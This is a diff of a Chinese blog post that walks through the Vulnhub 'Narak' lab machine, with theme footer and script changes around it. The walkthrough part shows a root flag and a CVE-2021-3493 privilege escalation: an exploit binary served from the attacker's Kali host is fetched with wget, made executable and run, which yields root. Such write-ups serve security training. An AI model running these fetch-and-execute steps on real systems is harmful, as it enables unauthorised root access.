+█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███
+█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
+█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
+█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
+█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
+█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█
+██████████████████████████████████████████████████████████████████████████████████████████
+                           
+                                                                                    
+Root Flag: <span class="token punctuation">&#123;</span>9440aee508b6215995219c58c8ba4b45<span class="token punctuation">&#125;</span>
+
+<span class="token operator">!</span><span class="token operator">!</span> Congrats you have finished this task <span class="token operator">!</span><span class="token operator">!</span>
+
+Contact us here:
+
+Hacking Articles <span class="token builtin class-name">:</span> https://twitter.com/hackinarticles
+
+Jeenali Kothari  <span class="token builtin class-name">:</span> https://www.linkedin.com/in/jeenali-kothari/
+
++-+-+-+-+-+ +-+-+-+-+-+-+-+
+ <span class="token operator">|</span>E<span class="token operator">|</span>n<span class="token operator">|</span>j<span class="token operator">|</span>o<span class="token operator">|</span>y<span class="token operator">|</span> <span class="token operator">|</span>H<span class="token operator">|</span>A<span class="token operator">|</span>C<span class="token operator">|</span>K<span class="token operator">|</span>I<span class="token operator">|</span>N<span class="token operator">|</span>G<span class="token operator">|</span>
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+
+__________________________________<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <h4 id="方法2-cve-2021-3493">2.4.2.2. 方法2-(CVE-2021-3493)</h4>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@ubuntu:/$ lsb_release -a
+lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu <span class="token number">18.04</span> LTS
+Release:        <span class="token number">18.04</span>
+Codename:       bionic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看到靶机的操作系统为Ubuntu 18.04 LTS。之前的渗透过程中了解了CVE-2021-3493的漏洞，专门针对Ubuntu进行提取。</p>
 <p>因此可以先在kali上编译之后（因为靶机上没有gcc环境）传入到靶机，然后执行即可。这里需要注意的一点是，如果是www-data用户的话，需要到/tmp下面才有读写执行权限，如果是inferno用户，还可以到自己的家目录。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">kali: </span><br><span class="line">┌──(root💀kali)-[/home/hdfzzf/CVE-2021-3493]</span><br><span class="line">└─<span class="comment"># python3 -m http.server                                  </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">靶机:</span><br><span class="line">www-data@ubuntu:/tmp$ wget http://10.0.2.4:8000/exp</span><br><span class="line">wget http://10.0.2.4:8000/exp</span><br><span class="line">--2022-05-01 05:25:55--  http://10.0.2.4:8000/exp</span><br><span class="line">Connecting to 10.0.2.4:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17376 (17K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line">exp                 100%[===================&gt;]  16.97K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2022-05-01 05:25:55 (38.2 MB/s) - <span class="string">&#x27;exp&#x27;</span> saved [17376/17376]</span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">exp</span><br><span class="line">www-data@ubuntu:/tmp$ chmod +x exp</span><br><span class="line">chmod +x exp</span><br><span class="line">www-data@ubuntu:/tmp$ ./exp</span><br><span class="line">./exp</span><br><span class="line">bash-4.4<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kali: 
+┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/hdfzzf/CVE-2021-3493<span class="token punctuation">]</span>
+└─<span class="token comment"># python3 -m http.server                                  </span>
+Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">8000</span> <span class="token punctuation">(</span>http://0.0.0.0:8000/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
+
+靶机:
+www-data@ubuntu:/tmp$ <span class="token function">wget</span> http://10.0.2.4:8000/exp
+<span class="token function">wget</span> http://10.0.2.4:8000/exp
+--2022-05-01 05:25:55--  http://10.0.2.4:8000/exp
+Connecting to <span class="token number">10.0</span>.2.4:8000<span class="token punctuation">..</span>. connected.
+HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
+Length: <span class="token number">17376</span> <span class="token punctuation">(</span>17K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
+Saving to: <span class="token string">'exp'</span>
+
+exp                 <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>  <span class="token number">16</span>.97K  --.-KB/s    <span class="token keyword">in</span> 0s      
+
+<span class="token number">2022</span>-05-01 05:25:55 <span class="token punctuation">(</span><span class="token number">38.2</span> MB/s<span class="token punctuation">)</span> - <span class="token string">'exp'</span> saved <span class="token punctuation">[</span><span class="token number">17376</span>/17376<span class="token punctuation">]</span>
+
+www-data@ubuntu:/tmp$ <span class="token function">ls</span>
+<span class="token function">ls</span>
+exp
+www-data@ubuntu:/tmp$ <span class="token function">chmod</span> +x exp
+<span class="token function">chmod</span> +x exp
+www-data@ubuntu:/tmp$ ./exp
+./exp
+bash-4.4<span class="token comment"># id</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>直接提权成功。</p>
 <h1 id="总结">3. 总结</h1>
 <p>通过对该靶机的渗透，学习到了一下三点：</p>
@@ -490,114 +475,164 @@
 <li>第一次遇到MOTD提权，虽然我直接用CVE-2021-3493提权了，但是该靶机上线的时间早于该漏洞</li>
 </ol>
 
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
     </div>
 
-    
-    
-    
 
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E7%BB%BC%E5%90%88/" rel="tag"># 综合</a>
-              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
-              <a href="/tags/%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4/" rel="tag"># 定制字典爆破</a>
-              <a href="/tags/UDP%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="tag"># UDP端口扫描</a>
-              <a href="/tags/webdav%E6%BC%8F%E6%B4%9E/" rel="tag"># webdav漏洞</a>
-              <a href="/tags/MOTD%E6%8F%90%E6%9D%83/" rel="tag"># MOTD提权</a>
-              <a href="/tags/brainfuck/" rel="tag"># brainfuck</a>
-          </div>
 
         
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2022/04/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20RCE%20ME/" rel="prev" title="极客大挑战 2019 RCE ME">
-                  <i class="fa fa-chevron-left"></i> 极客大挑战 2019 RCE ME
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/" rel="next" title="19 Vulnhub Gemini_Inc_1 Writeup">
-                  19 Vulnhub Gemini_Inc_1 Writeup <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
 
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1. 方法1-(暴力破解)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E6%89%AB%E6%8F%8Fudp%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2. 方法2-(扫描UDP端口)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-root%E6%9D%83%E9%99%90"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.2. get root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-motd%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">2.4.2.1. 方法1-(MOTD提权)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-cve-2021-3493"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">2.4.2.2. 方法2-(CVE-2021-3493)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
 
-
-
-
-
-    
-  <div class="comments" id="disqus_thread">
-    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
-  </div>
-  
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
-</div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">534k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">8:05</span>
-  </span>
-</div>
-<div class="busuanzi-count">
-</div>
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&text=18 Vulnhub Narak Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&is_video=false&description=18 Vulnhub Narak Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=18 Vulnhub Narak Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&title=18 Vulnhub Narak Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&name=18 Vulnhub Narak Writeup&description=&lt;p&gt;该靶机难度中等，通过该靶机的渗透，可以学到很多！&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/01/18%20Vulnhub%20Narak%20Writeup/&t=18 Vulnhub Narak Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
     </div>
-  </footer>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
 
   
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Google Analytics -->
 
-  
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Umami Analytics -->
 
+<!-- Disqus Comments -->
 
-  
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
 
-  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
-<script src="/js/third-party/math/mathjax.js"></script>
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
-
-<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
-<script src="/js/third-party/comments/disqus.js"></script>
+<!-- utterances Comments -->
 
 </body>
 </html>
